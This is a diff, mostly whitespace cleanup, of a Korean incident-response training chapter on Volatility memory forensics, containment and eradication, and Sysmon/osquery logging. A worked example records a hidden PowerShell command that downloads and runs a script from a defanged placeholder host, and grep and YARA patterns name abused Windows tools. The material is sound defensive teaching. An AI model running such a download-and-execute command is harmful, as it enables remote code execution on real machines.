@@ -28,14 +28,14 @@ sha256sum /mnt/usb/LIN-01_2025-11-01.lime > /mnt/usb/LIN-01_2025-11-01.lime.sha2
 ```
 
 **CoC(Chain of Custody) 필수 필드**
-- 증거 ID / 취득자 / 시간(KST) / 장소 / 대상 자산 / 도구·버전 / 해시  
+- 증거 ID / 취득자 / 시간(KST) / 장소 / 대상 자산 / 도구·버전 / 해시
 - 저장·인계 로그(누가 언제 어디로 이동·보관했는지)
 
 ---
 
 ## 11.3.2 Volatility 3 빠른 길라잡이 (Windows 중심)
 
-> 표준 명령 패턴: `vol -f <dump> <plugin> [옵션]`  
+> 표준 명령 패턴: `vol -f <dump> <plugin> [옵션]`
 > 심볼 자동 다운로드가 어려우면 `--offline` 대신 심볼 캐시 준비.
 
 ### A) 프로세스 복원(실행 트리·명령줄·환경)
@@ -55,8 +55,8 @@ vol -f WS-001.raw windows.psscan | grep -i "powershell\|wscript\|rundll32\|mshta
 ```
 
 **분석 포인트**
-- 부모/자식 불일치(`winword.exe → powershell.exe` 등)  
-- 사용자 세션 시간대 vs 업무 시간대  
+- 부모/자식 불일치(`winword.exe → powershell.exe` 등)
+- 사용자 세션 시간대 vs 업무 시간대
 - 경로 위장(`C:\Users\Public\` 하위 실행) / 서명 부재
 
 ### B) 이미지·모듈·주입 흔적
@@ -70,7 +70,7 @@ vol -f WS-001.raw windows.malfind --pid <PID> --dump
 # 덤프 산출물은 ./dump/ 하위 → 해시/AV/YARA로 정적 스캔
 ```
 
-**YARA (기본 IOC 예)**  
+**YARA (기본 IOC 예)**
 ```yar
 rule Suspicious_PowerShell_EncodedCommand {
   strings:
@@ -102,7 +102,7 @@ vol -f WS-001.raw windows.netscan | grep -i ESTAB | head -n 30
 ```
 
 **해석 포인트**
-- CLI(명령줄) 시점 vs 연결 시점 상관(타임라인)  
+- CLI(명령줄) 시점 vs 연결 시점 상관(타임라인)
 - egress(외부) IP/호스트의 희귀도 / 지리 / ASN (추후 위협 인텔 상관)
 
 ### E) 드라이버·커널(루트킷 탐지의 “관측” 단계)
@@ -118,8 +118,8 @@ vol -f WS-001.raw windows.devicetree | head -n 50
 ```
 
 **탐지 포인트**
-- 서명 부재/희귀 공급자  
-- 비표준 장치 경로(`\Device\*\EduDrv` 등)  
+- 서명 부재/희귀 공급자
+- 비표준 장치 경로(`\Device\*\EduDrv` 등)
 - IRP MajorFunction 가로채기 흔적(분석 메모)
 
 ---
@@ -135,16 +135,16 @@ vol -f LIN-01_2025-11-01.lime linux.bash | head -n 40
 ```
 
 **Linux 해석 포인트**
-- 커널 모듈(lsmod) 희귀 항목 / tainted 플래그  
-- SSH 활동(journalctl/secure) vs 메모리 소켓 상관  
+- 커널 모듈(lsmod) 희귀 항목 / tainted 플래그
+- SSH 활동(journalctl/secure) vs 메모리 소켓 상관
 - `.bash_history`/메모리 명령열 상호 검증
 
 ---
 
 ## 11.3.4 미니 케이스 — “다운로드 실행 의심” 복원 시나리오
 
-**상황**  
-- 17:43 KST: `powershell.exe` 통한 외부 443 연결 경보  
+**상황**
+- 17:43 KST: `powershell.exe` 통한 외부 443 연결 경보
 - 덤프 시각: 17:48 KST
 
 **절차 요약**
@@ -164,8 +164,8 @@ vol -f WS-001.raw windows.malfind --pid <PS_PID> --dump
 ```
 
 **결론 기록(예)**
-- 17:42:58 `powershell -nop -w hidden -c iwr https://hxxp[.]ex/k.ps1 | iex`  
-- 17:43:01 1회성 TLS 연결 후 추가 자식 프로세스 無 (차단 추정)  
+- 17:42:58 `powershell -nop -w hidden -c iwr https://hxxp[.]ex/k.ps1 | iex`
+- 17:43:01 1회성 TLS 연결 후 추가 자식 프로세스 無 (차단 추정)
 - `malfind` 양성 없음 / `dlllist` 정상 / 네트워크 세션 종료
 
 ---
@@ -175,9 +175,9 @@ vol -f WS-001.raw windows.malfind --pid <PS_PID> --dump
 ## 11.4.1 분류(Classification)
 
 **초기 티어링**
-- **Critical**: 랜섬 암호화 진행 / DA 토큰 탈취 징후 / 대규모 exfil  
-- **High**: C2 비콘 확인 / 내부 수평 이동 의심  
-- **Medium**: 다운로드·실행 시도 / 단일 호스트 의심  
+- **Critical**: 랜섬 암호화 진행 / DA 토큰 탈취 징후 / 대규모 exfil
+- **High**: C2 비콘 확인 / 내부 수평 이동 의심
+- **Medium**: 다운로드·실행 시도 / 단일 호스트 의심
 - **Low**: 오탐 가능성 높은 경고(정상 도구 과탐)
 
 **분류 기준(예)**
@@ -188,8 +188,8 @@ vol -f WS-001.raw windows.malfind --pid <PS_PID> --dump
 ## 11.4.2 격리(Containment)
 
 **기술 조치 예**
-- 네트워크 분리(EDR 네트워크 격리, NAC VLAN 이동)  
-- C2 도메인/IP 차단(프록시/방화벽/EDR)  
+- 네트워크 분리(EDR 네트워크 격리, NAC VLAN 이동)
+- C2 도메인/IP 차단(프록시/방화벽/EDR)
 - 해당 사용자 계정 잠금·회전, 세션 무효화
 
 **의사결정 매트릭스**
@@ -203,8 +203,8 @@ vol -f WS-001.raw windows.malfind --pid <PS_PID> --dump
 
 ## 11.4.3 제거(Eradication)
 
-- 악성 서비스/계정/스케줄러/런키 제거  
-- 지속성(Persistence) 제거: Run/RunOnce/Services/Task/WMIC/IFEO/AppInit_DLLs 등  
+- 악성 서비스/계정/스케줄러/런키 제거
+- 지속성(Persistence) 제거: Run/RunOnce/Services/Task/WMIC/IFEO/AppInit_DLLs 등
 - 레지스트리/파일 흔적 정리(증거 보전 사본 확보 후)
 
 **Windows 스크립트 예(관찰 위주)**
@@ -221,9 +221,9 @@ Get-ScheduledTask | Where-Object {$_.TaskPath -notlike '\Microsoft\*'} |
 
 ## 11.4.4 복구(Recovery)
 
-- 패치/구성(ASR/WDAC/LSA PPL/HVCI/LDAP·SMB 서명) 반영  
-- 자격 회전(gMSA·LAPS·Secrets), API 키·토큰 재발급  
-- 백업 복원(무결성 검증: 해시·샘플 부팅)  
+- 패치/구성(ASR/WDAC/LSA PPL/HVCI/LDAP·SMB 서명) 반영
+- 자격 회전(gMSA·LAPS·Secrets), API 키·토큰 재발급
+- 백업 복원(무결성 검증: 해시·샘플 부팅)
 - 모니터링 강화(탐지 룰 “감사→강제” 전환)
 
 ---
@@ -231,10 +231,10 @@ Get-ScheduledTask | Where-Object {$_.TaskPath -notlike '\Microsoft\*'} |
 ## 11.4.5 사후 보고(Post-Incident Report)
 
 **골격**
-1) 사건 개요(탐지→대응→종결 타임라인)  
-2) 유입 경로(가설·근거) / 수평 이동 여부 / 유출 증거  
-3) 조치(격리/제거/복구)와 잔여 리스크  
-4) 재발 방지(정책·구조·교육) + 마감일/오너  
+1) 사건 개요(탐지→대응→종결 타임라인)
+2) 유입 경로(가설·근거) / 수평 이동 여부 / 유출 증거
+3) 조치(격리/제거/복구)와 잔여 리스크
+4) 재발 방지(정책·구조·교육) + 마감일/오너
 5) 증거 목록·해시·CoC 첨부
 
 **간단 템플릿**
@@ -262,7 +262,7 @@ Get-ScheduledTask | Where-Object {$_.TaskPath -notlike '\Microsoft\*'} |
 > 원칙: **가시성 극대화 + 오탐 억제**. “허용 리스트 → 감사 → 강제” 순.
 
 **핵심 이벤트**
-- 1(ProcessCreate), 3(NetworkConnect), 7(ImageLoad), 10(ProcessAccess),  
+- 1(ProcessCreate), 3(NetworkConnect), 7(ImageLoad), 10(ProcessAccess),
   11(FileCreate), 12~14(Registry), 22(DNS), 23-24(FileDelete/Clipboard 옵션), 25-26(ProcessTampering 등)
 
 **스니펫(개념)**
@@ -305,7 +305,7 @@ Get-ScheduledTask | Where-Object {$_.TaskPath -notlike '\Microsoft\*'} |
 ```
 
 **운영 팁**
-- 2단계 필터: 에이전트 측(잡음 제거) + SIEM 측(상관·희귀도)  
+- 2단계 필터: 에이전트 측(잡음 제거) + SIEM 측(상관·희귀도)
 - 하위 OU(개발/랩)는 룰 강도 차등
 
 ---
@@ -313,8 +313,8 @@ Get-ScheduledTask | Where-Object {$_.TaskPath -notlike '\Microsoft\*'} |
 ## 11.5.2 수집 정책 — osquery (Windows/Linux/macOS)
 
 **핵심 테이블/쿼리**
-- `processes`, `process_open_files`, `listening_ports`, `hash`, `drivers`, `kernel_extensions`  
-- `scheduled_tasks`(win), `crontab`(lin), `launchd`(mac)  
+- `processes`, `process_open_files`, `listening_ports`, `hash`, `drivers`, `kernel_extensions`
+- `scheduled_tasks`(win), `crontab`(lin), `launchd`(mac)
 - `user_ssh_keys`, `authorized_keys`(lin), `chrome_extensions`
 
 **패키지 예(간단 Pack)**
@@ -348,7 +348,7 @@ Get-ScheduledTask | Where-Object {$_.TaskPath -notlike '\Microsoft\*'} |
 ```
 
 **운영 포인트**
-- 서버·워크스테이션 **별도 Pack**  
+- 서버·워크스테이션 **별도 Pack**
 - 결과는 **TLS/HTTPS 로깅**으로 중앙 수집(인증서 관리)
 
 ---
@@ -356,15 +356,15 @@ Get-ScheduledTask | Where-Object {$_.TaskPath -notlike '\Microsoft\*'} |
 ## 11.5.3 중앙집중 로깅 아키텍처
 
 **구성 요소**
-- **Forwarder/Agent**: Winlogbeat/Fluent/Osquery/EDR  
-- **메시지 버스**: Kafka(옵션)  
-- **스토리지/검색**: Elastic/Splunk/Sentinel/ClickHouse  
+- **Forwarder/Agent**: Winlogbeat/Fluent/Osquery/EDR
+- **메시지 버스**: Kafka(옵션)
+- **스토리지/검색**: Elastic/Splunk/Sentinel/ClickHouse
 - **장기보관**: S3·Object Storage(수명 주기 정책), Glacier 아카이브
 
 **파이프라인**
-1) 엔드포인트 → Forwarder에서 **필수 채널만 송신**  
-2) 중간 버퍼(옵션) → 급증 시 손실 방지  
-3) SIEM 인덱싱 → **파서/정규화**(ECS/CEF)  
+1) 엔드포인트 → Forwarder에서 **필수 채널만 송신**
+2) 중간 버퍼(옵션) → 급증 시 손실 방지
+3) SIEM 인덱싱 → **파서/정규화**(ECS/CEF)
 4) 장기 보관(압축·파티션·수명주기)
 
 **KQL/ES 예 — 고빈도 이벤트 요약 대시보드**
@@ -380,15 +380,15 @@ SecurityEvent
 ## 11.5.4 보존 주기(레텐션) & 법·비용 균형
 
 **권장 범위(예시, 조직·규정 따라 조정)**
-- **핵심 보안 이벤트**: 180~365일 온라인 (빠른 검색)  
-- **풀 로그(압축)**: 1~3년 오브젝트 스토리지(법/감사 준거)  
+- **핵심 보안 이벤트**: 180~365일 온라인 (빠른 검색)
+- **풀 로그(압축)**: 1~3년 오브젝트 스토리지(법/감사 준거)
 - **pcap/메모리/디스크 이미지**: 사건 단위로 **증거 보존 정책**(해시·암호화)
 
 **수명주기 정책 예(S3)**
 - 30일: 표준 → 90일: Infrequent Access → 1년: Glacier Deep Archive
 
 **무결성**
-- WORM/버저닝(삭제·변조 방지)  
+- WORM/버저닝(삭제·변조 방지)
 - 해시 매니페스트(월별) + 주기 검증(샘플 1%)
 
 ---
@@ -436,35 +436,35 @@ level: high
 ## 11.5.6 운영 점검표
 
 **수집/전송**
-- [ ] Sysmon 채널 손실률 < 0.5%  
-- [ ] osquery TLS 오류율 < 1% / 재시도 백오프 설정  
+- [ ] Sysmon 채널 손실률 < 0.5%
+- [ ] osquery TLS 오류율 < 1% / 재시도 백오프 설정
 - [ ] WEF/WinRM 구독 정상 여부(헬스 비트)
 
 **보관/검색**
-- [ ] 인덱스 파티션/ILM(수명주기) 정책 적용  
+- [ ] 인덱스 파티션/ILM(수명주기) 정책 적용
 - [ ] 비용 모니터(GB/일) & 카드inality 높은 필드 최소화
 
 **탐지/대응**
-- [ ] 상위 10 룰 오탐율(분기) 추적, 허용 리스트 갱신  
+- [ ] 상위 10 룰 오탐율(분기) 추적, 허용 리스트 갱신
 - [ ] 플레이북 RTO/RPO 만족(테이블탑 연 2회)
 
 ---
 
 # 부록: “끝에서 끝까지” 미니 랩 흐름 요약 (실무형)
 
-1) **수집**: WinPmem RAW + KAPE triage + osquery pack 수집  
-2) **메모리 분석**: Volatility — `pslist/pstree/cmdline/netstat/malfind/dlllist`  
-3) **네트워크**: Zeek/TShark — dns/http/ssl 타임라인  
-4) **타임라인**: Plaso → CSV → (선택) Timesketch 주석  
-5) **상관**: KQL/Sigma 룰 테스트(감사 모드)  
-6) **대응**: 격리→제거→복구 / 자격 회전 / 정책(ASR/WDAC/HVCI/LSA) 상향  
+1) **수집**: WinPmem RAW + KAPE triage + osquery pack 수집
+2) **메모리 분석**: Volatility — `pslist/pstree/cmdline/netstat/malfind/dlllist`
+3) **네트워크**: Zeek/TShark — dns/http/ssl 타임라인
+4) **타임라인**: Plaso → CSV → (선택) Timesketch 주석
+5) **상관**: KQL/Sigma 룰 테스트(감사 모드)
+6) **대응**: 격리→제거→복구 / 자격 회전 / 정책(ASR/WDAC/HVCI/LSA) 상향
 7) **보고**: 요약·근거·개선안·마감일 / 증거 해시·CoC 첨부
 
 ---
 
 # 마무리
 
-- **Volatility**는 “실행 맥락 복원”의 중심축입니다(프로세스·네트워크·드라이버).  
-- **플레이북**은 “누가·언제·무엇을”을 자동화 가능 수준으로 구체화해야 **RTO**를 단축합니다.  
-- **수집 정책(Sysmon/osquery) + 중앙 로깅 + 적절한 보존 주기**는 “탐지→분석→보고”의 시간을 **시간 단위**로 줄여줍니다.  
+- **Volatility**는 “실행 맥락 복원”의 중심축입니다(프로세스·네트워크·드라이버).
+- **플레이북**은 “누가·언제·무엇을”을 자동화 가능 수준으로 구체화해야 **RTO**를 단축합니다.
+- **수집 정책(Sysmon/osquery) + 중앙 로깅 + 적절한 보존 주기**는 “탐지→분석→보고”의 시간을 **시간 단위**로 줄여줍니다.
 - 모든 구성은 **감사 모드 → 강제 모드** 단계적 전환, **허용 리스트 선(先) 구축**이 핵심입니다.
